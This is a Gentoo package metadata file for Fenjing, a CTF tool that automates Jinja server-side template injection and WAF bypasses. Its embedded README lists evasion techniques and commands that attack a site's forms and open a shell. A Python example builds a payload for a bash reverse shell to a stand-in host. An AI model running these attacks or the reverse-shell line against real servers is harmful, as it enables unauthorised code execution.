<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE pkgmetadata SYSTEM "http://www.gentoo.org/dtd/metadata.dtd">
<pkgmetadata>
	<maintainer type="person">
		<email>gentoo@houseofsuns.org</email>
		<name>Markus Walter</name>
	</maintainer>
	<longdescription>![焚靖](assets/fenjing.webp)&gt; Bypass the WAF without knowing WAF焚靖是一个针对CTF比赛中Jinja SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。## 演示![demo](assets/demo.webp)## 主要特性- 集成了大部分CTF中的SSTI WAF绕过技巧- 全自动扫描HTML页面中的form元素并进行攻击- 全自动分析网站的WAF并生成相应的payload- 方便的网页界面/命令行界面## 快速上手在以下方法中选择一种### 使用pip安装运行```shellpip install fenjingpython -m fenjing webui```### 下载并运行docker镜像```shelldocker pull marven11/fenjingdocker run --net host -it marven11/fenjing webui```### 手动安装```shellgit clone https://github.com/Marven11/Fenjingcd Fenjingpython -m pip install -r requirements.txtpython -m fenjing webui```### 手动构建Docker镜像```shelldocker build -t fenjing .docker run -it --net host fenjing webui```## 特性支持绕过：- `'`和`&quot;`- 绝大多数敏感关键字- 任意阿拉伯数字- `_`- `[`- `+`- `-`- `~`- `{{`### 自然数绕过：支持绕过0-9的同时绕过加号或减号支持全角数字和特定数字相加减两种绕过方式### `'%c'`绕过:支持绕过引号，`g`和`lipsum`### 下划线绕过：支持`(lipsum|escape|batch(22)|list|first|last)`- 其中的数字22支持上面的数字绕过### 任意字符串：支持绕过引号，任意字符串拼接符号，下划线和任意关键词支持以下形式- `'str'`- `&quot;str&quot;`- `&quot;\x61\x61\x61&quot;`- `dict(__class__=cycler)|join`    - 其中的下划线支持绕过- `'%c'*3%(97,97, 97)`    - 其中的`'%c'`也支持上面的`'%c'`绕过    - 其中的所有数字都支持上面的数字绕过### 属性：- `['aaa']`    - 其中的字符串支持上面的任意字符串绕过- `.aaa`- `|attr('aaa')`    - 其中的字符串也支持上面的任意字符串绕过### Item- `['aaa']`    - 其中的字符串支持上面的任意字符串绕过- `.aaa`- `.__getitem__('aaa')`    - 其中的`__getitem__`支持上面的属性绕过    - 其中的字符串也支持上面的任意字符串绕过## 详细使用### 作为命令行脚本使用- webui: 网页UI  - 顾名思义，网页UI  - 默认端口11451- scan: 扫描整个网站  - 从网站中根据form元素提取出所有的表单并攻击  - 扫描成功后会提供一个模拟终端或执行给定的命令  - 示例：`python -m fenjing scan --url 'http://xxx/'`- crack: 对某个特定的表单进行攻击  - 需要指定表单的url, action(GET或POST)以及所有字段(比如'name')  - 攻击成功后也会提供一个模拟终端或执行给定的命令  - 示例：`python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`- get-config: 对某个特定的表单进行攻击，但是只获取flask config  - 参数大致上和crack相同```Usage: python -m fenjing scan [OPTIONS]Options:  -u, --url TEXT       需要扫描的URL  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式  --interval FLOAT     每次请求的间隔  --user-agent TEXT    请求时使用的User Agent  --help               Show this message and exit.Usage: python -m fenjing crack [OPTIONS]Options:  -u, --url TEXT       form所在的URL  -a, --action TEXT    form的action，默认为当前路径  -m, --method TEXT    form的提交方式，默认为POST  -i, --inputs TEXT    form的参数，以逗号分隔  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式  --interval FLOAT     每次请求的间隔  --user-agent TEXT    请求时使用的User Agent  --help               Show this message and exit.Usage: python -m fenjing get-config [OPTIONS]  攻击指定的表单，并获得目标服务器的flask configOptions:  -u, --url TEXT     form所在的URL  -a, --action TEXT  form的action，默认为当前路径  -m, --method TEXT  form的提交方式，默认为POST  -i, --inputs TEXT  form的参数，以逗号分隔  --interval FLOAT   每次请求的间隔  --user-agent TEXT  请求时使用的User Agent  --help             Show this message and exit.```### 作为python库使用参考[example.py](example.py)```pythonfrom fenjing import exec_cmd_payload, config_payloadimport logginglogging.basicConfig(level = logging.INFO)def waf(s: str):    blacklist = [        &quot;config&quot;, &quot;self&quot;, &quot;g&quot;, &quot;os&quot;, &quot;class&quot;, &quot;length&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;lipsum&quot;,        &quot;[&quot;, '&quot;', &quot;'&quot;, &quot;_&quot;, &quot;.&quot;, &quot;+&quot;, &quot;~&quot;, &quot;{{&quot;,        &quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;,        &quot;０&quot;,&quot;１&quot;,&quot;２&quot;,&quot;３&quot;,&quot;４&quot;,&quot;５&quot;,&quot;６&quot;,&quot;７&quot;,&quot;８&quot;,&quot;９&quot;    ]    return all(word in s for word in blacklist)if __name__ == &quot;__main__&quot;:    shell_payload, _ = exec_cmd_payload(waf, &quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\&quot;&quot;)    config_payload = config_payload(waf)    print(f&quot;{shell_payload=}&quot;)    print(f&quot;{config_payload=}&quot;)```其他使用例可以看[这里](examples.md)## 项目结构[![](https://mermaid.ink/img/pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg?type=png)](https://mermaid.live/edit#pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg)</longdescription>
</pkgmetadata>